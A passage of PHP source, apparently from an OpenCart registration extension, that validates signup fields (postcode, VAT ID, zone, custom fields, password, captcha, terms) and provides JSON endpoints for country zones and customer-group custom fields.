			if ( ($country_info && $country_info['postcode_required'] ) && ( strlen(utf8_decode($this->request->post['postcode'])) < 2 || strlen(utf8_decode($this->request->post['postcode'])) > 10)  ) {
				$this->error['postcode'] = $this->language->get('error_postcode');
			}
					
			if ( $this->config->get('custom_register_account_member_enable_postcode') ){
				
				if ( $this->config->get('custom_register_account_member_postcode_required') ) {
				
					// if empty or out of range:
					if ( strlen(utf8_decode($this->request->post['postcode'])) < 2 || strlen(utf8_decode($this->request->post['postcode'])) > 10) {
						$this->error['postcode'] = $this->language->get('error_postcode');
					}
				}
				// if not required, not empty but out of range
				elseif ( strlen(utf8_decode($this->request->post['postcode'])) > 0  && ( strlen(utf8_decode($this->request->post['postcode'])) < 2 || strlen(utf8_decode($this->request->post['postcode'])) > 10)  ) {
					$this->error['postcode'] = $this->language->get('error_postcode');
				}		
			}
			
		} else {
			$this->request->post['postcode'] = '';
		}
		
	

		// VAT VALIDATION IS AVAILABLE FROM Oc 1.5.3
		// CUSTOMER GROUPS, TAX ID AND COMPANY ID HAVE BEEN ADDED WITH Oc 1.5.3 and removed from 2.0.0.0
		if ( version_compare(VERSION, '1.5.3', '>=') && version_compare(VERSION, '1.5.6.4', '<=') ) {	
	
		// VAT Validation
			if ($country_info) {
				
				// VAT Validation
				$this->load->helper('vat');
				
				if ($this->config->get('config_vat') && $this->request->post['tax_id'] && (vat_validation($country_info['iso_code_2'], $this->request->post['tax_id']) == 'invalid')) {
					$this->error['tax_id'] = $this->language->get('error_vat');
				}					
			}
		}


		
		// if zone enabled
		if ( $this->config->get('custom_register_account_member_enable_zone') ){
			
			if ( isset($this->request->post['zone_id']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_zone_required') ) {
				
					if (!isset($this->request->post['zone_id']) || $this->request->post['zone_id'] == '') {
						$this->error['zone'] = $this->language->get('error_zone');
					}
				}
			}
		}
	
		// Custom field validation
		if ( version_compare(VERSION, '2.0.0.0', '>=') && isset($this->request->post['custom_field']) ) {
			
			$this->load->model('account/custom_field');

			$custom_fields = $this->model_account_custom_field->getCustomFields($customer_group_id);

			foreach ($custom_fields as $custom_field) {
				if ($custom_field['required'] && empty($this->request->post['custom_field'][$custom_field['location']][$custom_field['custom_field_id']])) {
					$this->error['custom_field'][$custom_field['custom_field_id']] = sprintf($this->language->get('error_custom_field'), $custom_field['name']);
				} 
				
				// From Oc 2.2.0.0 it has been introduced a regex validator
				else {
					$regex_field_types = array('text', 'textarea', 'file', 'date', 'time', 'datetime');
					if (version_compare(VERSION, '2.2.0.0', '>=') && (in_array($custom_field['type'], $regex_field_types) && !empty($custom_field['validation'])) && !filter_var($this->request->post['custom_field'][$custom_field['location']][$custom_field['custom_field_id']], FILTER_VALIDATE_REGEXP, array('options' => array('regexp' => $custom_field['validation'])))) {
						$this->error['custom_field'][$custom_field['custom_field_id']] = sprintf($this->language->get('error_custom_field_validate'), $custom_field['name']);
					}
				}
			}
		}
	
		if ( isset($this->request->post['password']) ){
			if ((strlen(utf8_decode($this->request->post['password'])) < 4) || (strlen(utf8_decode($this->request->post['password'])) > 20)) {
				$this->error['password'] = $this->language->get('error_password');
			}
		}


		if ( isset($this->request->post['confirm']) ){
		
			// if password confirm enabled
			if ( $this->config->get('custom_register_account_member_enable_confirm') ){
		
				// if wrong password or confirm pwd is empty:
				if (isset($this->error['password']) || $this->request->post['confirm'] == '') {
					$this->error['confirm'] = $this->language->get('error_confirm');
				}
				// pwd is right but doesn't match confirm pwd:
				elseif ($this->request->post['confirm'] != $this->request->post['password']) {
				//	$this->error['confirm'] = $this->language->get('error_confirm_1');
					$this->error['confirm'] = $this->language->get('error_confirm');
				}
			}
		}
		
		if ( version_compare(VERSION, '2.1.0.1', '>=') ) { 
			// Captcha
			if ($this->config->get($this->config->get('config_captcha') . '_status') && in_array('register', (array)$this->config->get('config_captcha_page'))) {
				$captcha = $this->load->controller('captcha/' . $this->config->get('config_captcha') . '/validate');

				if ($captcha) {
					$this->error['captcha'] = $captcha;
				}
			}
		}
		
		
		if ($this->config->get('config_account_id')) {
			$this->load->model('catalog/information');
			
			$information_info = $this->model_catalog_information->getInformation($this->config->get('config_account_id'));
			
			if ($information_info && !isset($this->request->post['agree'])) {
				$this->error['warning'] = sprintf($this->language->get('error_agree'), $information_info['title']);
			}
		}
		
    	return !$this->error;
  	}
	
	
	public function country() {
		$json = array();
		
		$this->load->model('localisation/country');

    	$country_info = $this->model_localisation_country->getCountry($this->request->get['country_id']);
		
		if ($country_info) {
			$this->load->model('localisation/zone');

			$json = array(
				'country_id'        => $country_info['country_id'],
				'name'              => $country_info['name'],
				'iso_code_2'        => $country_info['iso_code_2'],
				'iso_code_3'        => $country_info['iso_code_3'],
				'address_format'    => $country_info['address_format'],
				'postcode_required' => $country_info['postcode_required'],
				'zone'              => $this->model_localisation_zone->getZonesByCountryId($this->request->get['country_id']),
				'status'            => $country_info['status']		
			);
		}
		
		$this->response->setOutput(json_encode($json));
	}	
	
	
	public function customfield() {
		$json = array();

		$this->load->model('account/custom_field');

		// Customer Group
		if (isset($this->request->get['customer_group_id']) && is_array($this->config->get('config_customer_group_display')) && in_array($this->request->get['customer_group_id'], $this->config->get('config_customer_group_display'))) {
			$customer_group_id = $this->request->get['customer_group_id'];
		} else {
			$customer_group_id = $this->config->get('config_customer_group_id');
		}

		$custom_fields = $this->model_account_custom_field->getCustomFields($customer_group_id);

		foreach ($custom_fields as $custom_field) {
			$json[] = array(
				'custom_field_id' => $custom_field['custom_field_id'],
				'required'        => $custom_field['required'],
				'location'        => $custom_field['location']
			);
		}

		$this->response->addHeader('Content-Type: application/json');
		$this->response->setOutput(json_encode($json));
	}
}
